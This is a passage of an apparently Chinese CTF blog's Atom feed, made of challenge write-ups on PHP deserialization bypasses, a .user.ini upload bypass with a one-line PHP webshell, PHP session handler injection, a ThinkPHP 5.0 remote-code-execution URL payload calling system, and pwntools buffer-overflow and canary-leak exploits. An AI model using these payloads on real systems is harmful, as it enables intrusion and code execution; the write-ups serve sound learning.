        &lt;h2 id=&quot;WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码&quot;&gt;&lt;a href=&quot;#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【极客大挑战2019】PHP</title>
    <link href="http://yoursite.com/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/"/>
    <id>http://yoursite.com/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/</id>
    <published>2020-04-02T08:31:58.000Z</published>
    <updated>2020-04-02T08:53:20.743Z</updated>
    
    <content type="html"><![CDATA[<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" srcset="/img/loading.gif" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p><pre><code>&lt;?phpinclude &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);?&gt;</code></pre><p>发现了关键代码，考的应该是反序列化漏洞，去看class.php<br>class.php:</p><pre><code>&lt;?php include &#39;flag.php&#39;;  error_reporting(0);  class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>发现关键代码：</p><pre><code>      function __wakeup(){          $this-&gt;username = &#39;guest&#39;;      }</code></pre><p>因此需要对__wakeup()进行绕过。<br>接下来写php代码。</p><p>&lt;?php</p><pre><code>class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username, $password)    {        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$select = new Name(&#39;admin&#39;,100);$res=serialize(@$select);echo $res;</code></pre><p><img src="/img/28.png" srcset="/img/loading.gif" alt=""></p><blockquote><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p></blockquote><h1 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h1><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。<br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1:"></a>exp1:</h2><pre><code>import  requestsurl =&quot;http://7bc3f84d-1e2f-4a49-897a-15eb4d1d5255.node3.buuoj.cn&quot;html = requests.get(url+&#39;?select=O:4:&quot;Name&quot;:3:{s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;}&#39;)print(html.text)</code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2:"></a>exp2:</h2><p> 如果不使用python提交<br>在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><blockquote><p>payload:</p></blockquote><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这一题有两个地方卡住我了，第一个是没有想到备份名叫&lt;a href=&quot;http://www.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip&lt;/a&gt;.&lt;br&gt;第二个是public、protected与private在序列化时的区别。&lt;br
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>上传绕过  .user.ini</title>
    <link href="http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/"/>
    <id>http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/</id>
    <published>2020-03-28T12:23:26.000Z</published>
    <updated>2020-03-28T12:27:01.738Z</updated>
    
    <content type="html"><![CDATA[<p>今天做了一题是BUUCTF上的checkin<br>一道文件上传题，题目首先对文件内容进行了过滤，过滤了<?因此<?php  ?>就不行了因此应该用<script language="php">eval($_POST['a']);</script>。同时这道题对文件名也过滤的死死的于是想用.htaccess但是发现没有用，后来知道该文件需要apache而这里是nginx。则需要.user.ini</p><blockquote><p>auto_prepend_file=X.jpg</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天做了一题是BUUCTF上的checkin&lt;br&gt;一道文件上传题，题目首先对文件内容进行了过滤，过滤了&lt;?因此&lt;?php  ?&gt;就不行了因此应该用&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;。同时这道题对文件名也过滤
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>easy calc</title>
    <link href="http://yoursite.com/2020/03/18/easy-calc/"/>
    <id>http://yoursite.com/2020/03/18/easy-calc/</id>
    <published>2020-03-18T10:59:58.000Z</published>
    <updated>2020-03-18T10:59:58.972Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/chrysanthemum/p/11757363.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/chrysanthemum/p/11
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>easy_tornado</title>
    <link href="http://yoursite.com/2020/03/15/easy-tornado/"/>
    <id>http://yoursite.com/2020/03/15/easy-tornado/</id>
    <published>2020-03-15T03:35:06.000Z</published>
    <updated>2020-03-15T03:52:04.843Z</updated>
    
    <content type="html"><![CDATA[<p>welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。</p><p>就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，<br>最后总体加密。同时观察hint.txt的url发现</p><pre><code>file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16</code></pre><p> 那么最终就是：</p><blockquote><blockquote><p>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</p></blockquote></blockquote><p> python脚本：</p><pre><code> import hashlibdef hash(value):    md5 = hashlib.md5(value)    md5.update(value)    result = md5.hexdigest()    return resultdef jiami():    filename = &#39;/fllllllllllllag&#39;    cookie_S = &#39;de639f1e-0c39-46e5-b8cb-1cd29f56aea3&#39;    print(hash(filename.encode(&#39;utf-8&#39;)))    x = hash(filename.encode(&#39;utf-8&#39;))    y = cookie_S +x    print(hash(y.encode(&#39;utf-8&#39;)))jiami()</code></pre><p>参考链接：<a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。&lt;/p&gt;
&lt;p&gt;就是说要通过模板注入找到cookie_secret,然后编写py
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>关于php的session.serialize_handler的问题</title>
    <link href="http://yoursite.com/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2020-03-10T03:50:59.000Z</published>
    <updated>2020-03-10T03:51:00.890Z</updated>
    
    <content type="html"><![CDATA[<p>前言<br>php的session信息是储存在文件中的</p><p>session.save_path=”” 指定储存的路径<br>session.save_handler=”” 指定储存时使用的函数（默认是file）<br>session.auto_start boolen<br>session.serialize_handler=”” 定义序列化和反序列化的处理器的名字，默认是php(5.5.4后改为php_serialize)<br>session.serialize_handler存在以下几种</p><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>php 键名+竖线（|）+经过serialize()函数处理过的值<br>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化<br>使用过程中如果想要修改，使用</p><p>ini_set(‘session.serialize_handler’,’php_serialize’);<br>但这里设置的handler如果和默认的不同，就会出问题</p><p>比如默认是php的handler，在该页面设置为php_serialize</p><p>这是如果我们传入一个 ‘|O:5:”Class”‘;,这样的一个数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以|作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p><p>CTF<br>jarvisoj PHPINFO</p><p>引用官方文档的内容</p><p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p><p>通俗的说就是请求时加上与session.upload_progress.name同名的变量时就会在$_SESSION中加上一组新的数据</p><p>来看这道题，题目给了源码</p><?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{    public $mdzz;    function __construct()    {        $this->mdzz = 'phpinfo();';    }    function __destruct()    {        eval($this->mdzz);    }}if(isset($_GET['phpinfo'])){    $m = new OowoO();}else{    highlight_string(file_get_contents('index.php'));}?><p>看到这里使用了ini_set(‘sessionserialize_handler’:’php’),有预感会出现handler不一样的问题</p><p>接下来查看phpinfo，发现php版本是5.6.21，大于5.5.4，默认的handler是php_serialize，会出现上面所述的问题</p><p>在使用session_start()时会自动加载session文件中的值，因为在这里在__destruct方法中使用eval，所以只要在session文件中写入这个类，就能够执行代码？</p><p>但是我们如何将类写入session文件？</p><p>这就用到刚才提到的东西，查看phpinfo，<br>因为session.upload_progress.enabled=1，所以我们就可以post一个和session.upload_progress.name同名的变量，来使得我们上传的文件名写入session</p><p>因为这里是php handler，是以|开头的，所以在反序列化时会按照|来识别键值对而不是按照默认的php_serialize来识别session，所以我们将文件名改为</p><p>“|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}”<br>来读取文件目录</p><p>问题<br>session部分的问题大致是解决了……剩下的问题就是……为什么要将双引号转义？暂时还没有弄清楚，待日后分析吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言&lt;br&gt;php的session信息是储存在文件中的&lt;/p&gt;
&lt;p&gt;session.save_path=”” 指定储存的路径&lt;br&gt;session.save_handler=”” 指定储存时使用的函数（默认是file）&lt;br&gt;session.auto_start bool
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP_RCE</title>
    <link href="http://yoursite.com/2020/03/08/PHP-RCE/"/>
    <id>http://yoursite.com/2020/03/08/PHP-RCE/</id>
    <published>2020-03-08T10:22:17.000Z</published>
    <updated>2020-03-08T10:24:47.722Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞利用：ThinkPHP 5.0<br>此框架存在远程代码执行漏洞<br>漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。</p><p>在controller获取控制器后，直接进行赋值，但是并没有对控制器的名进行严格的检测，导致可以使用斜杠等特殊符号来远程代码注入。</p><p>我们来搭建一下网站的环境，apache+mysql+Linux centos系统，搭建好的测试环境地址是<a href="http://127.0.01/anquan" target="_blank" rel="noopener">http://127.0.01/anquan</a> ，我们可以直接在index.php后面伪造攻击参数，示例如下：</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</a><br>通过该漏洞也可以直接远程代码注入执行phpinfo语句，查询当前的php版本，路径，扩展，以及php.ini存放的地址，都可以看得到，构造如下代码即可。</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;</a></p><p>但是我想能不能输入一句话木马，其实是可以的，但是我在攻防世界的题目中用蚁剑没有连入成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;漏洞利用：ThinkPHP 5.0&lt;br&gt;此框架存在远程代码执行漏洞&lt;br&gt;漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>图片验证码灰度化、二值化处理</title>
    <link href="http://yoursite.com/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/"/>
    <id>http://yoursite.com/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/</id>
    <published>2020-03-03T05:50:03.000Z</published>
    <updated>2020-03-03T05:52:07.110Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import tesserocrfrom PIL import Imageimage = Image.open(&#39;code2.jpg&#39;)image = image.convert(&#39;L&#39;)threshold = 127table = []for i in range(256):    if i &lt; threshold:        table.append(0)    else:        table.append(1)</code></pre><p>   二：</p><pre><code>from PIL import  Imageimport subprocessimage = Image.open(&#39;code.jpg&#39;)image = image.point(lambda x: 0 if x&lt;127 else 255)image.save(&#39;code2.jpg&#39;)subprocess.call([&quot;tesseract&quot;, &#39;code2.jpg&#39;, &quot;output&quot;])with open(&#39;output.txt&#39;, &#39;r&#39;) as f:    print(f.read())</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import tesserocr
from PIL import Image

image = Image.open(&amp;#39;code2.jpg&amp;#39;)

image = image.convert(&amp;#39;L&amp;#39;)
threshold = 1
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</title>
    <link href="http://yoursite.com/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/"/>
    <id>http://yoursite.com/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/</id>
    <published>2020-02-27T02:19:25.000Z</published>
    <updated>2020-02-27T02:19:26.587Z</updated>
    
    <content type="html"><![CDATA[<p>Intval函数获取变量整数数值<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。</p><p>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p><p>intval($req[“number”])=intval(strrev($req[“number”]))  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：number=0e-0%00</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Intval函数获取变量整数数值&lt;br&gt;Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 21474836
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界pwn1</title>
    <link href="http://yoursite.com/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/"/>
    <id>http://yoursite.com/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/</id>
    <published>2020-02-15T04:30:11.000Z</published>
    <updated>2020-02-15T04:30:12.260Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/lxy8584099/p/11887235.html" target="_blank" rel="noopener">https://www.cnblogs.com/lxy8584099/p/11887235.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/lxy8584099/p/11887235.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/lxy8584099/p/11887235
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界stack2</title>
    <link href="http://yoursite.com/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/"/>
    <id>http://yoursite.com/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/</id>
    <published>2020-02-11T08:34:46.000Z</published>
    <updated>2020-02-11T08:34:47.797Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0" target="_blank" rel="noopener">https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzp
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CG-CTF Stack Overflow</title>
    <link href="http://yoursite.com/2020/02/10/CG-CTF-Stack-Overflow/"/>
    <id>http://yoursite.com/2020/02/10/CG-CTF-Stack-Overflow/</id>
    <published>2020-02-10T07:32:54.000Z</published>
    <updated>2020-02-10T07:41:31.222Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><p>先执行一下程序。通过观察可以从message里面找溢出点，发现第一个数组A长度为40但是可以输入60。并且n就在A数组的下面，因此我们可以通过溢出修改n的长度，并且写了/bin/sh<br>下面是exp；</p><pre><code>from pwn import *re = remote(&#39;182.254.217.142&#39;,10001)fgets_plt = 0x080483D0data_addr = 0x0804A024re.sendline(&#39;1&#39;)payload1 = &#39;a&#39;*0x28 + p32(0x60) +&#39;/bin/sh&#39;re.sendline(payload1)payload2 = &#39;a&#39;*0x30 + &#39;aaaa&#39; + p32(0x080483f0) + &#39;aaaa&#39; +p32(0x0804A0AD)re.sendline(payload2)re.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Stack-Overflow&quot;&gt;&lt;a href=&quot;#Stack-Overflow&quot; class=&quot;headerlink&quot; title=&quot;Stack Overflow&quot;&gt;&lt;/a&gt;Stack Overflow&lt;/h1&gt;&lt;p&gt;先执行一下程序。通过观察可以从message
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界forgot</title>
    <link href="http://yoursite.com/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/"/>
    <id>http://yoursite.com/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/</id>
    <published>2020-02-08T03:54:30.000Z</published>
    <updated>2020-02-08T05:00:52.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><p>首先检查一下文件</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>可以确定的是栈上面的变量覆盖，但是覆盖地址的时候需要注意*(&amp;v3 + –v14)这个式子，我们需要把函数地址放到这个地址上面(&amp;v3是栈上面的地址，其计算是按照字节来计算而不是位，所以做的时候要注意计算的答案)。由于v14的初始值为1，并且里面正则判断的时候没有关于大写字符的判断，我们就可以直接写入大写字符覆盖v2，并将v3覆盖为我们需要的函数的地址，就可以拿到flag。<br>关注这个循环里面的内容，里面相当于正则表达式的判断，但是你仔细分析里switch中的函数时，可以发现没有判断大写字符的地方，我们可以注入大写字符，来达到不改变v14的值的效果。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;forgot&quot;&gt;&lt;a href=&quot;#forgot&quot; class=&quot;headerlink&quot; title=&quot;forgot&quot;&gt;&lt;/a&gt;forgot&lt;/h1&gt;&lt;p&gt;首先检查一下文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Arch:     i386-32-little
RELRO
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界Mary_Morton</title>
    <link href="http://yoursite.com/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/"/>
    <id>http://yoursite.com/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/</id>
    <published>2020-02-08T03:36:31.000Z</published>
    <updated>2020-02-08T03:50:49.801Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/gaonuoqi/p/11760970.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaonuoqi/p/11760970.html</a></p><pre><code>Welcome to the battle ! [Great Fairy] level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2aaaa-%x-%x-%x-%x-%x-%x-%x-%xaaaa-451173d0-7f-d652c260-0-0-61616161-252d7825-2d78252d</code></pre><p>可以看见偏移量是6个字节。<br>又因为0x90-0x8=0x88,0x88/8+6=23.<br>故exp：</p><pre><code>from pwn import *r=remote(&#39;111.198.29.45&#39;,53501)r.recvuntil(&#39;3. Exit the battle&#39;)r.sendline(&#39;2&#39;)r.sendline(&#39;%23$p&#39;)r.recvuntil(&#39;0x&#39;)canary=int(r.recv(16),16)print (canary)flag_addr=0x4008dapayload=&#39;a&#39;*0x88+p64(canary)+&#39;a&#39;*8+p64(flag_addr)r.recvuntil(&#39;3. Exit the battle&#39;)r.sendline(&#39;1&#39;)r.sendline(payload)r.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gaonuoqi/p/11760970.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/gaonuoqi/p/11760970.htm
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XCTF int_overflow</title>
    <link href="http://yoursite.com/2020/02/03/XCTF-int-overflow/"/>
    <id>http://yoursite.com/2020/02/03/XCTF-int-overflow/</id>
    <published>2020-02-03T03:52:18.000Z</published>
    <updated>2020-02-03T03:52:19.256Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/thread-1032448-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1032448-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.52pojie.cn/thread-1032448-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.52pojie.cn/thread-1032448-1-1.html&lt;/a
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>jarvisoj pwn smashes</title>
    <link href="http://yoursite.com/2020/02/01/jarvisoj-pwn-smashes/"/>
    <id>http://yoursite.com/2020/02/01/jarvisoj-pwn-smashes/</id>
    <published>2020-02-01T04:36:40.000Z</published>
    <updated>2020-02-01T04:38:26.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h1><p><a href="https://blog.csdn.net/kevin66654/article/details/86773547" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773547</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;smashes&quot;&gt;&lt;a href=&quot;#smashes&quot; class=&quot;headerlink&quot; title=&quot;smashes&quot;&gt;&lt;/a&gt;smashes&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/kevin66654/article/
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
